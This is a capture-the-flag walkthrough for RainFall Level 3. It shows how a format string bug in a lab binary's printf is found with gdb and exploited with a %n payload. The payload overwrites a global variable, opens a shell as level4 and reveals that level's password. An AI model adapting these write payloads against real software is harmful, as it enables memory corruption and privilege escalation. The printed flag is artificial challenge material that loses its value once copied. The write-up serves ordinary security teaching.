# RainFall Level 3 Walkthrough

## Objective

The goal of Level 3 is to exploit the `level3` binary using a **format string vulnerability** in order to modify a variable in memory and gain access to `level4`.

---

## Step 1: Examine the Environment

After switching to `level3`:

```bash
level7@RainFall:~$ su level3
Password:
level3@RainFall:~$ ls
level3
```

> Important notes:
>
> * **No stack canary** → stack overflows possible.
> * **NX disabled** → executable stack.
> * **No PIE** → static addresses.

---

## Step 2: First Run

Running the program with format specifiers:

```bash
./level3
%p %p %p
0x200 0xb7fd1ac0 0xb7ff37d0
```

> The input is passed directly into `printf`, confirming a **format string vulnerability**.

This means the printf used is not protected. instead of printing the absolute value of the string it interprets it while reading the stack.

Let's try to pinpoint at which point printf starts interacting with the stack:

```bash
./level3 "aaaa %p %p %p %p %p"
aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x20702520
```

---

## Step 3: Disassemble the Program

Open the binary in GDB:

```bash
gdb ./level3
```

Check functions:

```gdb
info functions
```

Notable functions:

```
0x08048390  printf@plt
0x080483a0  fgets@plt
0x080483c0  system@plt
0x080484a4  v
0x0804851a  main
```

Disassemble `main`:

```gdb
disas main
```

```asm
0x0804851a <+0>:  call   0x80484a4 <v>
```

So execution flows directly to `v`.

Disassemble `v`:

```gdb
disas v
```

Key observations:

* Input is read with `fgets`.
* Then printed with `printf` (vulnerable).
* The global variable `m` (`0x0804988c`) is compared to `0x40`.
* If `m == 0x40`, the program calls `system("/bin/sh")`.

---

## Step 4: Identify the Target

Check global variables:

```gdb
info var
```

Output:

```
0x0804988c  m
```

So we need to set `m = 0x40`.

> I am not going into too many details here, but v compares m to 0x40 == 64

---

## Step 5: Exploitation Strategy

We can use a format string payload with `%n` to write to `m`.

Address of `m`: `0x0804988c`.

Construct payload:

```bash
python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' > /tmp/lv3
```

Run it:

```bash
./level3 < /tmp/lv3
```

Output:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
```

> The message *“Wait what?!”* confirms that `m` was successfully modified.

---

## Step 6: Get a Shell

Run interactively:

```bash
cat /tmp/lv3 - | ./level3
```

Now check identity:

```bash
whoami
level4
```

Retrieve the password:

```bash
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Step 7: Summary

* **Vulnerability:** Format string bug in `printf`.
* **Target:** Global variable `m` at `0x0804988c`.
* **Exploit:** Use `%n` to set `m = 0x40`.
* **Payload Example:**

  ```bash
  python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' > /tmp/lv3
  ./level3 < /tmp/lv3
  ```
* **Outcome:** Escalation to `level4` and retrieval of its password.

---

**End of Level 3 Walkthrough**

